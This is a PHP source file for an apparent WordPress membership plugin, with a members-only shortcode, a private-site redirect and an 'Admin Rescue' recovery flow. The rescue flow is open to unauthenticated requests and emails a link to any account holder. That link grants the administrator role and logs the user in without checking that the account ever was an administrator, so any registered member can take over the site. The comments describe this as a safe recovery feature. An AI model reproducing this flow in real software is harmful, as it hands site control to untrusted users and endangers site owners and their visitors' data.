<?php
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

class FBMP_Access {

	const RESCUE_TRANSIENT_PREFIX = 'fbmp_rescue_';

	public static function init() {
		add_shortcode( 'fbmp_restrict', array( __CLASS__, 'restrict_shortcode' ) );
		add_action( 'template_redirect', array( __CLASS__, 'enforce_private_site' ) );
		add_action( 'wp_ajax_nopriv_fbmp_request_rescue', array( __CLASS__, 'handle_rescue_request' ) );
		add_action( 'wp_ajax_fbmp_request_rescue', array( __CLASS__, 'handle_rescue_request' ) );
		add_action( 'init', array( __CLASS__, 'handle_rescue_confirm' ) );
	}

	/**
	 * [fbmp_restrict role="premium_member"]...[/fbmp_restrict]
	 * role can be: free_member, premium_member, or any (any logged-in
	 * member role). Administrators always see everything.
	 */
	public static function restrict_shortcode( $atts, $content = '' ) {
		$atts = shortcode_atts(
			array(
				'role'    => 'premium_member',
				'message' => 'This content is available to Premium members only.',
			),
			$atts,
			'fbmp_restrict'
		);

		if ( current_user_can( 'manage_options' ) ) {
			return do_shortcode( $content );
		}

		if ( ! is_user_logged_in() ) {
			return '<div class="fbmp-locked-notice" style="padding:16px;border-radius:10px;background:#f3f4f6;color:#374151;">' . esc_html( $atts['message'] ) . '</div>';
		}

		$user = wp_get_current_user();

		if ( 'any' === $atts['role'] ) {
			$allowed = array_intersect( array( 'free_member', 'premium_member' ), (array) $user->roles );
		} else {
			$allowed = in_array( $atts['role'], (array) $user->roles, true );
		}

		if ( $allowed ) {
			return do_shortcode( $content );
		}

		return '<div class="fbmp-locked-notice" style="padding:16px;border-radius:10px;background:#f3f4f6;color:#374151;">' . esc_html( $atts['message'] ) . '</div>';
	}

	/**
	 * Private Site mode: if enabled in Settings, anyone not logged in is
	 * sent to the login page — except the login/register pages themselves
	 * (or they could never log in) and wp-login.php/wp-admin (core handles
	 * those separately).
	 */
	public static function enforce_private_site() {
		if ( '1' !== get_option( 'fbmp_private_site', '0' ) ) {
			return;
		}

		if ( is_user_logged_in() || is_admin() ) {
			return;
		}

		$exempt_ids = array_filter(
			array(
				(int) get_option( 'fbmp_login_page_id' ),
				(int) get_option( 'fbmp_register_page_id' ),
			)
		);

		if ( is_page( $exempt_ids ) ) {
			return;
		}

		wp_safe_redirect( FBMP_Roles::get_page_url( 'fbmp_login_page_id' ) );
		exit;
	}

	/**
	 * Step 1 of Admin Rescue: someone locked out of wp-admin submits the
	 * email on their account. If it matches a real user we email a
	 * short-lived, single-use link. We never reveal whether the email
	 * matched anything (avoids leaking which emails have accounts).
	 */
	public static function handle_rescue_request() {
		check_ajax_referer( 'fbmp_nonce', 'nonce' );

		$email = isset( $_POST['email'] ) ? sanitize_email( wp_unslash( $_POST['email'] ) ) : '';

		if ( empty( $email ) || ! is_email( $email ) ) {
			wp_send_json_error( array( 'message' => 'Please enter a valid email address.' ) );
		}

		$user = get_user_by( 'email', $email );

		if ( $user ) {
			$token = wp_generate_password( 32, false );
			set_transient( self::RESCUE_TRANSIENT_PREFIX . $token, $user->ID, 15 * MINUTE_IN_SECONDS );

			$rescue_url = add_query_arg( 'fbmp_rescue_token', $token, home_url( '/' ) );

			wp_mail(
				$user->user_email,
				'Restore your Administrator access',
				"Someone (hopefully you) requested to restore Administrator access on your site.\n\n"
				. "This link is valid for 15 minutes and can only be used once:\n"
				. $rescue_url . "\n\n"
				. "If you didn't request this, you can safely ignore this email."
			);
		}

		// Always return the same generic success message either way.
		wp_send_json_success( array( 'message' => 'If that email matches an account, a restore link has been sent.' ) );
	}

	/**
	 * Step 2: visiting the emailed link restores the Administrator role
	 * and logs the person in, then sends them to wp-admin.
	 */
	public static function handle_rescue_confirm() {
		if ( empty( $_GET['fbmp_rescue_token'] ) ) {
			return;
		}

		$token         = sanitize_text_field( wp_unslash( $_GET['fbmp_rescue_token'] ) );
		$transient_key = self::RESCUE_TRANSIENT_PREFIX . $token;
		$user_id       = get_transient( $transient_key );

		if ( ! $user_id ) {
			wp_die( 'This restore link is invalid or has expired. Please request a new one from the login page.', 'Link Expired', array( 'response' => 403 ) );
		}

		// Single-use: burn the token immediately.
		delete_transient( $transient_key );

		$user = new WP_User( $user_id );
		if ( ! in_array( 'administrator', (array) $user->roles, true ) ) {
			$user->add_role( 'administrator' );
		}
		// Also make sure no stray member role is left on the account.
		$user->remove_role( 'free_member' );
		$user->remove_role( 'premium_member' );

		wp_set_current_user( $user_id );
		wp_set_auth_cookie( $user_id, true );

		wp_safe_redirect( admin_url() );
		exit;
	}
}
